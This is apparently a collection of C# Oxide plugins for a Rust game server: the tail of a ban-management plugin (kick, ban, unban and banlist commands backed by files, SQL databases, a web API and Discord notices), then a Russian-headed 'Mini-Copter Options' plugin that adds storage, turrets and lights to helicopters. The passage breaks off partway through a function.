            int max = startid + 9;

            var banlist = players.All.Where(x => x.IsBanned).ToList();

            string returnstring = FormatReturn(BanSystem.Native, GetMsg("Banlist"), startid.ToString(), max.ToString(), banlist.Count.ToString());

            foreach (IPlayer b in banlist)
            {
                i++;
                if (i < startid) continue;
                if (i > max) break;
                returnstring += string.Format("{0} - {1} - {2}", b.Id, b.Name, ToShortString(b.BanTimeRemaining));
            }

            return returnstring;
        }


        ////////////////////////////////////////////////////////////
        // Kick
        ////////////////////////////////////////////////////////////

        string Kick(object source, string target, string reason, bool shouldBroadcast = true)
        {
            string r = string.Empty;
            var foundplayers = FindConnectedPlayers(target, source, out r);
            if (r != string.Empty)
            {
                return r;
            }

            var returnkick = string.Empty;
            foreach (var iplayer in foundplayers)
            {
                returnkick += ExecuteKick(source, iplayer, reason, shouldBroadcast) + "\r\n";
            }

            return returnkick;
        }
        string TryKick(object source, string[] args)
        {
            string target = args[0];
            string reason = args.Length > 1 ? args[1] : "Kicked";
            return Kick(source, target, reason);
        }

        string ExecuteKick(object source, IPlayer player, string reason, bool shouldBroadcast = true)
        {
            if (shouldBroadcast && Kick_Broadcast)
            {
                server.Broadcast(GetMsg("PlayerKick", null, player.Name.ToString(), reason));
                if (Discord_use)
                {
                    object payload = new[]
                    {
                        new{name="Player", value=$"[{player.Name}](https://steamcommunity.com/profiles/{player.Id})", inline=true},
                        new{name="Kicked By", value=source is IPlayer ? ((IPlayer)source).Name : source.ToString(),inline=true },
                        new{name="Reason", value=reason, inline=false}
                    };
                    string json = JsonConvert.SerializeObject(payload);
                    DiscordMessages.Call("API_SendFancyMessage", Discord_Webhook, "Player Kick", 3329330, json);
                }
            }

            if (Kick_Log)
                Interface.Oxide.LogWarning(GetMsg("{0} was kicked from the server ({1})", null, player.Name.ToString(), reason));

            player.Kick(reason);


            return GetMsg("{0} was kicked from the server ({1})", source, player.Name.ToString(), reason);
        }


        ////////////////////////////////////////////////////////////
        // IsBanned
        ////////////////////////////////////////////////////////////
        bool isBanned_Check(string name, string steamid, string ip)
        {
            int count = 0;
            if (BanSystemHasFlag(banSystem, BanSystem.Files))
            {
                count++;
                var files = cachedBans.Values.Where(x => x.steamid == steamid).ToList();
                if (files.Count > 0)
                {
                    return true;
                }
            }
            if (BanSystemHasFlag(banSystem, BanSystem.PlayerDatabase))
            {
                count++;
                var playerdatabase = PlayerDatabase.Call("GetPlayerDataRaw", steamid, "Banned");
                if (playerdatabase is string && playerdatabase != null)
                {
                    return true;
                }
            }
            if (BanSystemHasFlag(banSystem, BanSystem.MySQL))
            {
                count++;
                bool foundMySQL = false;
                Sql.Query(Core.Database.Sql.Builder.Append("SELECT * from enhancedbansystem WHERE `steamid` = @0", steamid), Sql_conn, list =>
                {
                    if (list != null)
                    {
                        foundMySQL = true;
                    }
                });
                if (foundMySQL)
                {
                    return true;
                }
            }
            if (BanSystemHasFlag(banSystem, BanSystem.SQLite))
            {
                count++;
                bool sqlite = false;
                Sqlite.Query(Core.Database.Sql.Builder.Append("SELECT * from EnhancedBanSystem WHERE `steamid` == @0", steamid), Sqlite_conn, list =>
                {
                    if (list != null)
                    {
                        sqlite = true;
                    }
                });
                if (sqlite)
                {
                    return true;
                }
            }
            if (BanSystemHasFlag(banSystem, BanSystem.WebAPI))
            {
                count++;
                bool banned = false;
                webrequest.Enqueue(FormatOnlineBansystem(WebAPI_IsBanned_Request, new Dictionary<string, string> { { "{id}", null }, { "{steamid}", steamid }, { "{name}", name }, { "{ip}", ip }, { "{source}", "Auto Ban" }, { "{update}", false.ToString() }, { "{time}", LogTime().ToString() } }), null, (code, response) =>
                {
                    if (response != null || code != 200)
                    {
                        if (response == "true")
                        {
                            banned = true;
                        }
                    }
                    else
                    {
                        Interface.Oxide.LogWarning("WebAPI couldn't be contacted or is not valid");
                    }
                }, this);
                if (banned == true)
                {
                    return banned;
                }
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Native) && count > 0)
            {
                return false;
            }
            else if (BanSystemHasFlag(banSystem, BanSystem.Native) && count == 0)
            {
                var player = players.FindPlayer(steamid);
                return player != null && player.IsBanned;
            }
            return false;
        }
        bool isBanned_NonDelayed(string name, string steamid, string ip, bool update, out BanData bandata)
        {
            bool denied = false;
            bandata = null;
            if (!denied && BanSystemHasFlag(banSystem, BanSystem.Native))
            {
                if (Native_IsBanned(steamid))
                {
                    if (Log_Denied)
                        Interface.Oxide.LogInfo(string.Format("Native: {0} - {1} - {2} was rejected from the server", steamid, name, ip));
                    denied = true;
                }
            }
            if (!denied && BanSystemHasFlag(banSystem, BanSystem.PlayerDatabase))
            {
                if (PlayerDatabase_IsBanned(steamid, ip, out bandata))
                {
                    if (Log_Denied)
                        Interface.Oxide.LogInfo(string.Format("PlayerDatabase: {0} - {1} - {2} was rejected from the server", steamid, name, ip));
                    denied = true;
                }
            }
            if (!denied && BanSystemHasFlag(banSystem, BanSystem.Files))
            {
                if (Files_IsBanned(steamid, ip, out bandata))
                {
                    if (Log_Denied)
                        Interface.Oxide.LogInfo(string.Format("Files: {0} - {1} - {2} was rejected from the server", steamid, name, ip));
                    denied = true;
                }
            }
            if (update && denied)
            {
                if (bandata != null && (bandata.ip != ip || bandata.steamid != steamid))
                    PrepareBan("Auto Ban", steamid, name, ip, BanEvadeReason, bandata.expire == 0.0 ? 0.0 : bandata.expire - LogTime(), false);
                else if (bandata == null)
                    PrepareBan("Auto Ban", steamid, name, ip, BanEvadeReason, 0.0, false);
            }
            return bandata != null;
        }

        void isBanned_Delayed(string name, string steamid, string ip, bool update)
        {
            var partialBan = new BanData("Auto Ban", steamid, name, ip, string.Empty, 0.0);
            if (BanSystemHasFlag(banSystem, BanSystem.SQLite))
            {
                SQLite_IsBanned(partialBan, update);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.MySQL))
            {
                MySQL_IsBanned(partialBan, update);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.WebAPI))
            {
                WebAPI_IsBanned(partialBan, update);
            }
        }

        ////////////////////////////////////////////////////////////
        // Banlist
        ////////////////////////////////////////////////////////////

        string TryBanlist(object source, string[] args)
        {
            int startID = 0;
            BanSystem bs;
            if (args != null && args.Length > 1)
            {
                int.TryParse(args[1], out startID);
            }
            switch (args[0].ToLower())
            {
                case "files":
                    bs = BanSystem.Files;
                    break;
                case "mysql":
                    bs = BanSystem.MySQL;
                    break;
                case "native":
                    bs = BanSystem.Native;
                    break;
                case "playerdatabase":
                    bs = BanSystem.PlayerDatabase;
                    break;
                case "sqlite":
                    bs = BanSystem.SQLite;
                    break;
                case "webapi":
                    bs = BanSystem.WebAPI;
                    break;
                default:
                    return GetMsg("BanlistSyntax1", source);
            }

            return Banlist(source, bs, startID);
        }

        string Banlist(object source, BanSystem bs, int startID)
        {
            switch (bs)
            {
                case BanSystem.Files:
                    return Files_Banlist(source, startID);
                case BanSystem.MySQL:
                    return MySQL_Banlist(source, startID);
                case BanSystem.Native:
                    return Native_Banlist(source, startID);
                case BanSystem.PlayerDatabase:
                    return PlayerDatabase_Banlist(source, startID);
                case BanSystem.SQLite:
                    return SQLite_Banlist(source, startID);
                case BanSystem.WebAPI:
                    return WebAPI_Banlist(source, startID);
                default:
                    return string.Empty;
            }
        }

        ////////////////////////////////////////////////////////////
        // Ban
        ////////////////////////////////////////////////////////////


        string TryBan(object source, string[] args)
        {
            string ipaddress = isIPAddress(args[0]) ? args[0] : string.Empty;
            string steamid = string.Empty;
            string name = string.Empty;
            string errorreason = string.Empty;
            ulong userID;
            double duration = 0.0;
            string reason = BanDefaultReason;
            TimeSpan duration1;
            if (args.Length > 2 && TryParseTimeSpan(args[1], out duration1))
            {
                duration = duration1.TotalSeconds;
                reason = string.Join(" ", args.Skip(2).ToArray());
            }
            else if (args.Length > 1)
            {
                reason = string.Join(" ", args.Skip(1).ToArray());
            }
            if (ipaddress.Length != 0)
            {
                return BanIP(source, ipaddress, reason, duration);
            }
            else
            {
                var foundplayers = FindPlayers(args[0], source, out errorreason);
                if (errorreason != string.Empty | errorreason.Length != 0)
                {
                    if (ulong.TryParse(args[0], out userID) && userID.IsSteamId())
                    {
                        return BanID(source, args[0], reason, duration);
                    }
                    return errorreason;
                }
                return BanPlayer(source, foundplayers[0], reason, duration);
            }
        }

        string BanIP(object source, string ip, string reason, double duration)
        {
            return PrepareBan(source, string.Empty, string.Empty, ip, reason, duration, Kick_OnBan);
        }

        string BanID(object source, string steamid, string reason, double duration)
        {
            string name = GetPlayerName(steamid);
            string ipaddress = GetPlayerIP(steamid);

            return PrepareBan(source, steamid, name, ipaddress, reason, duration, Kick_OnBan);
        }

        string BanPlayer(object source, IPlayer player, string reason, double duration)
        {
            var address = GetPlayerIP(player);

            return PrepareBan(source, player.Id, player.Name, address, reason, duration, Kick_OnBan);
        }

        string PrepareBan(object source, string userID, string name, string ip, string reason, double duration, bool kick)
        {
            var bandata = new BanData(source, userID, name, ip, reason, duration);


            return ExecuteBan(source, bandata, kick);
        }
        string ExecuteBan(object source, BanData bandata, bool kick)
        {
            Unsubscribe(nameof(OnUserBanned));
            if (wasBanned.Contains(bandata.id)) return string.Empty;

            string returnstring = null;
            if (BanSystemHasFlag(banSystem, BanSystem.PlayerDatabase))
            {
                returnstring += PlayerDatabase_ExecuteBan(bandata);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Files))
            {
                returnstring += Files_ExecuteBan(bandata);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.MySQL))
            {
                returnstring += MySQL_ExecuteBan(source, bandata);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.SQLite))
            {
                returnstring += SQLite_ExecuteBan(source, bandata);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.WebAPI))
            {
                returnstring += WebAPI_ExecuteBan(source, bandata);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Native))
            {
                returnstring += Native_ExecuteBan(bandata);
            }

            if (Ban_Broadcast)
                if (bandata.name != string.Empty | bandata.steamid != string.Empty)
                    server.Broadcast(bandata.expire == 0.0 ? GetMsg("PlayerPermBan", null, bandata.name, bandata.reason) : GetMsg("PlayerTempBan", null, bandata.name, FormatTime(TimeSpan.FromSeconds(bandata.expire - LogTime())), bandata.reason));
                else if (bandata.ip != string.Empty)
                    server.Broadcast(bandata.expire == 0.0 ? GetMsg("IPPermBan", null, bandata.reason) : GetMsg("IPTempBan", null, FormatTime(TimeSpan.FromSeconds(bandata.expire - LogTime())), bandata.reason));

            if (Ban_Log && (source is IPlayer) && ((IPlayer)source).Id != "server_console")
                Interface.Oxide.LogWarning(returnstring);

            if (kick)
                Kick(source, bandata.steamid != string.Empty ? bandata.steamid : bandata.ip, bandata.reason ?? "Banned", true);

            wasBanned.Add(bandata.id);
            if (Discord_use)
            {
                object payload = new[]
                {
                    new {name="Player",value=bandata.name.Length != 0 ? $"[{bandata.name}](https://steamcommunity.com/profiles/{bandata.steamid})" : bandata.steamid.Length != 0 ? $"[{bandata.steamid}](https://steamcommunity.com/profiles/{bandata.steamid})" : "An IP", inline=true},
                    new {name="Type",value=bandata.expire != 0.0 ? $"Temporarily ({FormatTime(TimeSpan.FromSeconds(bandata.expire - LogTime()))})" : "Permanently", inline=true},
                    new {name="Banned By", value=bandata.source, inline=true },
                    new {name="Reason",value=bandata.reason, inline=false}
                };
                string json = JsonConvert.SerializeObject(payload);
                DiscordMessages?.Call("API_SendFancyMessage", Discord_Webhook, "Player Ban", 3329330, json);
            }
            timer.Once(5f, () => { Subscribe(nameof(OnUserBanned)); });
            return returnstring;
        }

        ////////////////////////////////////////////////////////////
        // Unban
        ////////////////////////////////////////////////////////////

        string ExecuteUnban(object source, string steamid, string name, string ip)
        {
            string returnstring = string.Empty;
            List<BanData> unbanList = new List<BanData>();
            List<BanData> unbanList2 = new List<BanData>();

            if (BanSystemHasFlag(banSystem, BanSystem.PlayerDatabase))
            {
                returnstring += PlayerDatabase_ExecuteUnban(steamid, name, ip, out unbanList);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Files))
            {
                returnstring += Files_ExecuteUnban(steamid, name, ip, out unbanList2);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.MySQL))
            {
                returnstring += MySQL_ExecuteUnban(source, steamid, name, ip);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.SQLite))
            {
                returnstring += SQLite_ExecuteUnban(source, steamid, name, ip);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.WebAPI))
            {
                returnstring += WebAPI_ExecuteUnban(source, steamid, name, ip);
            }
            if (BanSystemHasFlag(banSystem, BanSystem.Native))
            {
                returnstring += Native_ExecuteUnban(steamid, name);
            }

            foreach (var b in unbanList)
            {
                if (cachedBans.ContainsKey(b.id))
                    cachedBans.Remove(b.id);
            }
            foreach (var b in unbanList2)
            {
                if (cachedBans.ContainsKey(b.id))
                    cachedBans.Remove(b.id);
            }
            OnServerSave();
            return returnstring;
        }

        string TryUnBan(object source, string[] args)
        {
            string ipaddress = isIPAddress(args[0]) ? args[0] : string.Empty;
            string steamid = string.Empty;
            ulong userID = 0L;
            string name = string.Empty;
            string errorreason = string.Empty;

            if (ipaddress != string.Empty)
            {
                return ExecuteUnban(source, string.Empty, string.Empty, ipaddress);
            }
            else
            {
                ulong.TryParse(args[0], out userID);
                return ExecuteUnban(source, userID != 0L ? args[0] : string.Empty, userID == 0L ? args[0] : string.Empty, string.Empty);
            }
        }


        ////////////////////////////////////////////////////////////
        // Commands
        ////////////////////////////////////////////////////////////
        [Command("ban", "player.ban")]
        void cmdBan(IPlayer player, string command, string[] args)
        {
            if (!hasPermission(player, PermissionBan))
            {
                player.Reply(GetMsg("NoPermission", player.Id.ToString()));
                return;
            }
            if (args == null || (args.Length < 1))
            {
                player.Reply(GetMsg("BanSyntax", player.Id.ToString()));
                return;
            }
            try
            {
                player.Reply(TryBan(player, args));
            }
            catch (Exception e)
            {
                player.Reply("ERROR:" + e.Message);
                Puts(e.StackTrace);
            }
        }

        [Command("banlist", "player.banlist")]
        void cmdBanlist(IPlayer player, string command, string[] args)
        {
            if (!hasPermission(player, PermissionBanlist))
            {
                player.Reply(GetMsg("NoPermission", player.Id.ToString()));
                return;
            }
            if (args == null || args.Length == 0)
            {
                string replystring = GetMsg("BanlistSyntax", player.Id.ToString()) + "\n";
                replystring += GetMsg("BanSystems", player.Id.ToString());
                if (BanSystemHasFlag(banSystem, BanSystem.Files))
                {
                    replystring += "Files\n";
                }
                if (BanSystemHasFlag(banSystem, BanSystem.MySQL))
                {
                    replystring += "MySQL\n";
                }
                if (BanSystemHasFlag(banSystem, BanSystem.Native))
                {
                    replystring += "Native\n";
                }
                if (BanSystemHasFlag(banSystem, BanSystem.PlayerDatabase))
                {
                    replystring += "PlayerDatabase\n";
                }
                if (BanSystemHasFlag(banSystem, BanSystem.SQLite))
                {
                    replystring += "SQLite\n";
                }
                if (BanSystemHasFlag(banSystem, BanSystem.WebAPI))
                {
                    replystring += "WebAPI\n";
                }
                player.Reply(replystring);
                return;
            }
            try
            {
                player.Reply(TryBanlist(player, args));
            }
            catch (Exception e)
            {
                player.Reply("ERROR:" + e.Message);
            }
        }

        [Command("kick", "player.kick")]
        void cmdKick(IPlayer player, string command, string[] args)
        {
            if (!hasPermission(player, PermissionKick))
            {
                player.Reply(GetMsg("NoPermission", player.Id.ToString()));
                return;
            }
            if (args == null || (args.Length < 1))
            {
                player.Reply(GetMsg("KickSyntax", player.Id.ToString()));
                return;
            }
            try
            {
                player.Reply(TryKick(player, args));
            }
            catch (Exception e)
            {
                player.Reply("ERROR:" + e.Message);
            }
        }

        [Command("unban", "player.unban")]
        void cmdUnban(IPlayer player, string command, string[] args)
        {
            if (!hasPermission(player, PermissionUnban))
            {
                player.Reply(GetMsg("NoPermission", player.Id.ToString()));
                return;
            }
            if (args == null || (args.Length < 1))
            {
                player.Reply(GetMsg("UnbanSyntax", player.Id.ToString()));
                return;
            }
            try
            {
                player.Reply(TryUnBan(player, args));
            }
            catch (Exception e)
            {
                player.Reply("ERROR:" + e.Message);
            }
        }
    }
}


###ПЛАГИН НА КОПТЕР(МОЖЕТ УВЕЛИЧИТЬ ЕГО СКОРОСТЬ И УПРАВЛЯЕСТЬ К ПРИМЕРУ МЫШКОЙ И Т.Д###


using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Mini-Copter Options", "Pho3niX90", "2.2.3")]
    [Description("Provide a number of additional options for Mini-Copters, including storage and seats.")]
    class MiniCopterOptions : CovalencePlugin
    {
        #region Prefab Modifications

        private readonly string minicopterPrefab = "assets/content/vehicles/minicopter/minicopter.entity.prefab";
        private readonly string scrapHeliPrefab = "assets/content/vehicles/scrap heli carrier/scraptransporthelicopter.prefab";
        private readonly string storagePrefab = "assets/prefabs/deployable/hot air balloon/subents/hab_storage.prefab";
        private readonly string storageLargePrefab = "assets/content/vehicles/boats/rhib/subents/rhib_storage.prefab";
        private readonly string autoturretPrefab = "assets/prefabs/npc/autoturret/autoturret_deployed.prefab";
        private readonly string switchPrefab = "assets/prefabs/deployable/playerioents/simpleswitch/switch.prefab";
        private readonly string searchLightPrefab = "assets/prefabs/deployable/search light/searchlight.deployed.prefab";
        private readonly string batteryPrefab = "assets/prefabs/deployable/playerioents/batteries/smallrechargablebattery.deployed.prefab";
        private readonly string flasherBluePrefab = "assets/prefabs/deployable/playerioents/lights/flasherlight/electric.flasherlight.deployed.prefab";
        private readonly string lockPrefab = "assets/prefabs/locks/keypad/lock.code.prefab";
        private readonly string spherePrefab = "assets/prefabs/visualization/sphere.prefab";

        private const string resizableLootPanelName = "generic_resizable";
        private const int MinStorageCapacity = 6;
        private const int MaxStorageCapacity = 48;

        private readonly object False = false;

        private Configuration config;
        private MiniCopterDefaults copterDefaults;
        private bool lastRanAtNight;
        private int setupTimeHooksAttempts;
        private TOD_Sky time;
        private float sunrise;
        private float sunset;
        private float lastNightCheck;

        void Init() {
            if (config.storageContainers > 3) {
                PrintWarning($"Storage Containers configuration value {config.storageContainers} exceeds the maximum, setting to 3.");
                config.storageContainers = 3;
            } else if (config.storageContainers < 0) {
                PrintWarning($"Storage Containers cannot be a negative value, setting to 0.");
                config.storageContainers = 0;
            }

            if (config.storageLargeContainers > 2) {
                PrintWarning($"Large Storage Containers configuration value {config.storageLargeContainers} exceeds the maximum, setting to 2.");
                config.storageLargeContainers = 2;
            } else if (config.storageLargeContainers < 0) {
                PrintWarning($"Large Storage Containers cannot be a negative value, setting to 0.");
                config.storageLargeContainers = 0;
            }

            if (config.largeStorageSize > MaxStorageCapacity) {
                PrintWarning($"Large Storage Containers Capacity configuration value {config.largeStorageSize} exceeds the maximum, setting to {MaxStorageCapacity}.");
                config.largeStorageSize = MaxStorageCapacity;
            } else if (config.largeStorageSize < MinStorageCapacity) {
                PrintWarning($"Storage Containers Capacity cannot be a smaller than {MinStorageCapacity}, setting to {MinStorageCapacity}.");
            }

            Unsubscribe(nameof(OnEntitySpawned));

            if (!config.autoturret) {
                Unsubscribe(nameof(OnTurretTarget));
            }
        }

        bool IsNight() {
            if (time == null)
                return false;

            float hour = time.Cycle.Hour;
            return hour > sunset || hour < sunrise;
        }

        void OnHour() {
            float hour = time.Cycle.Hour;
            bool isNight = IsNight();

            //Puts($"OnHour: hour is now {hour}, and it is night {isNight}");
            if ((isNight == lastRanAtNight) || (lastNightCheck == hour))
                return;

            //Puts($"OnHour Called: Night:{isNight} LastRanAtNight:{lastRanAtNight}");
            lastNightCheck = hour;

            var minis = BaseNetworkable.serverEntities.OfType<MiniCopter>().ToArray();
            //Puts($"OnHour Called: Minis to modify {minis.Count}");\
            foreach (var mini in minis) {
                var tailLight = mini.GetComponentInChildren<FlasherLight>();
                if (tailLight != null) {
                    tailLight.SetFlag(IOEntity.Flag_HasPower, isNight);
                }
            }

            lastRanAtNight ^= true;
        }

        void SetupTimeHooks() {
            time = TOD_Sky.Instance;

            if (time == null) {
                if (setupTimeHooksAttempts++ >= 10) {
                    PrintError("Unable to detect time system. Tail light will not follow time of day.");;
                    return;
                }

                timer.Once(1, SetupTimeHooks);
                return;
            }

            sunrise = time.SunriseTime;
            sunset = time.SunsetTime;

            time.Components.Time.OnHour += OnHour;
        }

        StorageContainer[] GetStorage(MiniCopter copter) => copter.GetComponentsInChildren<StorageContainer>()
            .Where(x => x.name == storagePrefab || x.name == storageLargePrefab)
            .ToArray();

        void AddLargeStorageBox(MiniCopter copter) {
            //sides,negative left | up and down | in and out

            if (config.storageLargeContainers == 1) {
                AddStorageBox(copter, storageLargePrefab, new Vector3(0.0f, 0.07f, -1.05f), Quaternion.Euler(0, 180f, 0));
            } else if (config.storageLargeContainers >= 2) {
                AddStorageBox(copter, storageLargePrefab, new Vector3(-0.48f, 0.07f, -1.05f), Quaternion.Euler(0, 180f, 0));
                AddStorageBox(copter, storageLargePrefab, new Vector3(0.48f, 0.07f, -1.05f), Quaternion.Euler(0, 180f, 0));
            }

        }

        void AddRearStorageBox(MiniCopter copter) {
            AddStorageBox(copter, storagePrefab, new Vector3(0, 0.75f, -1f));
        }

        void AddSideStorageBoxes(MiniCopter copter) {
            AddStorageBox(copter, storagePrefab, new Vector3(0.6f, 0.24f, -0.35f));
            if (!IsBatteryEnabled()) {
                AddStorageBox(copter, storagePrefab, new Vector3(-0.6f, 0.24f, -0.35f));
            }
        }

        void AddStorageBox(MiniCopter copter, string prefab, Vector3 position) {
            AddStorageBox(copter, prefab, position, Quaternion.identity);
        }

        void SetupStorage(StorageContainer box) {
            if (box.PrefabName.Equals(storageLargePrefab)) {
                box.isLockable = config.largeStorageLockable;
                box.inventory.capacity = config.largeStorageSize;
                box.panelName = resizableLootPanelName;
            }
        }

        void AddStorageBox(MiniCopter copter, string prefab, Vector3 position, Quaternion rotation) {
            StorageContainer box = GameManager.server.CreateEntity(prefab, position, rotation) as StorageContainer;

            box.Spawn();
            box.SetParent(copter);

            SetupStorage(box);
            box.SendNetworkUpdateImmediate();
        }

        void SetupInvincibility(BaseCombatEntity entity) {
            entity._maxHealth = 99999999f;
            entity._health = 99999999f;
            entity.SendNetworkUpdate();
        }

        void SetupTailLight(FlasherLight tailLight) {
            tailLight.pickup.enabled = false;
            DestroyGroundComp(tailLight);
            tailLight.SetFlag(IOEntity.Flag_HasPower, IsNight());
        }

        void AddTailLight(MiniCopter copter) {
            FlasherLight tailLight = GameManager.server.CreateEntity(flasherBluePrefab, new Vector3(0, 1.2f, -2.0f), Quaternion.Euler(33, 180, 0)) as FlasherLight;
            SetupTailLight(tailLight);
            tailLight.SetParent(copter);
            tailLight.Spawn();
            SetupInvincibility(tailLight);
        }

        void SetupSphereEntity(SphereEntity sphereEntity) {
            sphereEntity.EnableSaving(true);
            sphereEntity.EnableGlobalBroadcast(false);
        }

        void SetupSearchLight(SearchLight searchLight) {
            searchLight.pickup.enabled = false;
            DestroyMeshCollider(searchLight);
            DestroyGroundComp(searchLight);
        }

        void AddSearchLight(MiniCopter copter) {
            SphereEntity sphereEntity = GameManager.server.CreateEntity(spherePrefab, new Vector3(0, -100, 0), Quaternion.identity) as SphereEntity;
            SetupSphereEntity(sphereEntity);
            sphereEntity.SetParent(copter);
            sphereEntity.Spawn();

            SearchLight searchLight = GameManager.server.CreateEntity(searchLightPrefab, sphereEntity.transform.position) as SearchLight;
            SetupSearchLight(searchLight);
            searchLight.Spawn();
            SetupInvincibility(searchLight);
            searchLight.SetFlag(BaseEntity.Flags.Reserved5, true);
            searchLight.SetFlag(BaseEntity.Flags.Busy, true);
            searchLight.SetParent(sphereEntity);
            searchLight.transform.localPosition = Vector3.zero;
            searchLight.transform.localRotation = Quaternion.Euler(-20, 180, 180);

            sphereEntity.currentRadius = 0.1f;
            sphereEntity.lerpRadius = 0.1f;
            sphereEntity.UpdateScale();
            sphereEntity.SendNetworkUpdateImmediate();

            timer.Once(3f, () => {
                if (sphereEntity != null)
                    sphereEntity.transform.localPosition = new Vector3(0, 0.24f, 1.8f);
            });
        }

        void AddLock(BaseEntity entity) {
            CodeLock codeLock = GameManager.server.CreateEntity(lockPrefab) as CodeLock;

            codeLock.Spawn();
            codeLock.code = "789456789123";
            codeLock.SetParent(entity, entity.GetSlotAnchorName(BaseEntity.Slot.Lock));
            codeLock.transform.localScale += new Vector3(-50, -50, -50);
            entity.SetSlot(BaseEntity.Slot.Lock, codeLock);
            codeLock.SetFlag(BaseEntity.Flags.Locked, true);
        }

        void SetupAutoTurret(AutoTurret turret) {
            turret.pickup.enabled = false;
            turret.sightRange = config.turretRange;
            DestroyMeshCollider(turret);
            DestroyGroundComp(turret);
        }

        void AddTurret(MiniCopter copter) {
            AutoTurret turret = GameManager.server.CreateEntity(autoturretPrefab, new Vector3(0, 0, 2.47f)) as AutoTurret;
            SetupAutoTurret(turret);
            turret.SetParent(copter);
            turret.Spawn();

            BasePlayer player = BasePlayer.FindByID(copter.OwnerID);
            if (player != null) {
                turret.authorizedPlayers.Add(new ProtoBuf.PlayerNameID() {
                    userid = player.userID,
                    username = player.displayName,
                });
                turret.SendNetworkUpdate();
            }

            AddSwitch(turret);
        }

        bool IsBatteryEnabled() => config.autoturretBattery && config.autoturret;

        void SetupBattery(ElectricBattery battery) {
            battery.maxOutput = 12;
            battery.pickup.enabled = false;
            DestroyGroundComp(battery);
            DestroyColliders(battery);
        }

        ElectricBattery AddBattery(MiniCopter copter) {
            var batteryPosition = copter.transform.TransformPoint(new Vector3(-0.7f, 0.2f, -0.2f));
            var batteryRotation = copter.transform.rotation;

            ElectricBattery battery = GameManager.server.CreateEntity(batteryPrefab, batteryPosition, batteryRotation) as ElectricBattery;
            SetupBattery(battery);
            battery.Spawn();
            battery.SetParent(copter, worldPositionStays: true);
            SetupInvincibility(battery);

            return battery;
        }

        void SetupSwitch(ElectricSwitch electricSwitch) {
            electricSwitch.pickup.enabled = false;
            DestroyMeshCollider(electricSwitch);
            DestroyGroundComp(electricSwitch);
        }

        void AddSwitch(AutoTurret turret) {
            ElectricBattery battery = null;
            if (IsBatteryEnabled()) {
                battery = AddBattery(turret.GetParentEntity() as MiniCopter);
            }

            var switchPosition = turret.transform.TransformPoint(new Vector3(0f, -0.65f, 0.325f));
            var switchRotation = turret.transform.rotation;

            ElectricSwitch electricSwitch = GameManager.server.CreateEntity(switchPrefab, switchPosition, switchRotation) as ElectricSwitch;
            SetupSwitch(electricSwitch);
            electricSwitch.Spawn();
            SetupInvincibility(electricSwitch);

            // Spawning the switch at the desired world position and then parenting it, allows it to render correctly initially.
            electricSwitch.SetParent(turret, worldPositionStays: true);

            if (!IsBatteryEnabled()) {
                RunWire(electricSwitch, 0, turret, 0, 12);
            } else if (battery != null) {
                RunWire(battery, 0, electricSwitch, 0);
                RunWire(electricSwitch, 0, turret, 0);
            }
        }

        // https://umod.org/community/rust/12554-trouble-spawning-a-switch?page=1#post-5
        private void RunWire(IOEntity source, int s_slot, IOEntity destination, int d_slot, int power = 0) {
            destination.inputs[d_slot].connectedTo.Set(source);
            destination.inputs[d_slot].connectedToSlot = s_slot;
            destination.inputs[d_slot].connectedTo.Init();
            source.outputs[s_slot].connectedTo.Set(destination);
            source.outputs[s_slot].connectedToSlot = d_slot;
            source.outputs[s_slot].connectedTo.Init();
            source.MarkDirtyForceUpdateOutputs();
            if (power > 0) {
                destination.UpdateHasPower(power, 0);
                source.UpdateHasPower(power, 0);
            }
            source.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);
            destination.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);
        }

        void DestroyGroundComp(BaseEntity ent) {
            UnityEngine.Object.DestroyImmediate(ent.GetComponent<DestroyOnGroundMissing>());
            UnityEngine.Object.DestroyImmediate(ent.GetComponent<GroundWatch>());
        }

        void DestroyMeshCollider(BaseEntity ent) {
            foreach (var mesh in ent.GetComponentsInChildren<MeshCollider>()) {
                UnityEngine.Object.DestroyImmediate(mesh);
            }
        }

        void DestroyColliders(BaseEntity ent) {
            foreach (var collider in ent.GetComponentsInChildren<Collider>()) {
                UnityEngine.Object.DestroyImmediate(collider);
            }
        }

        IOEntity GetBatteryConnected(MiniCopter ent) {
            return ent.GetComponentInChildren<ElectricBattery>()?.inputs[0]?.connectedTo.ioEnt;
        }

        void FixScrapHeliIfNeeded(ScrapTransportHelicopter scrapHeli) {
            if (scrapHeli.torqueScale != copterDefaults.torqueScale)
                return;

            var scrapHeliTemplate = GameManager.server.FindPrefab(scrapHeliPrefab)?.GetComponent<ScrapTransportHelicopter>();
            if (scrapHeliTemplate == null)
                return;

            scrapHeli.fuelPerSec = scrapHeliTemplate.fuelPerSec;
            scrapHeli.liftFraction = scrapHeliTemplate.liftFraction;
            scrapHeli.torqueScale = scrapHeliTemplate.torqueScale;
        }

        void RestoreMiniCopter(MiniCopter copter, bool removeStorage = false) {
            if (copter is ScrapTransportHelicopter)
                return;

            if (copterDefaults != null) {
                // Allow setting fuelPerSec to negative to make the plugin do nothing.
                // Don't update fuelPerSec if not currently the configured value, because another plugin probably updated it.
                if (config.fuelPerSec >= 0 && copter.fuelPerSec == config.fuelPerSec) {
                    copter.fuelPerSec = copterDefaults.fuelPerSecond;
                }
                copter.liftFraction = copterDefaults.liftFraction;
                copter.torqueScale = copterDefaults.torqueScale;
            }

            if (removeStorage) {
                foreach (var child in copter.children.FindAll(child => child.name == storagePrefab || child.name == storageLargePrefab || child.name == autoturretPrefab))
                    child.Kill();
            }
        }

        void ModifyMiniCopter(MiniCopter copter) {

            // Allow setting fuelPerSec to negative to make the plugin do nothing.
            // Don't update fuelPerSec if not currently set to vanilla default, because another plugin probably updated it.
            if (config.fuelPerSec >= 0 && copterDefaults != null && copter.fuelPerSec == copterDefaults.fuelPerSecond) {
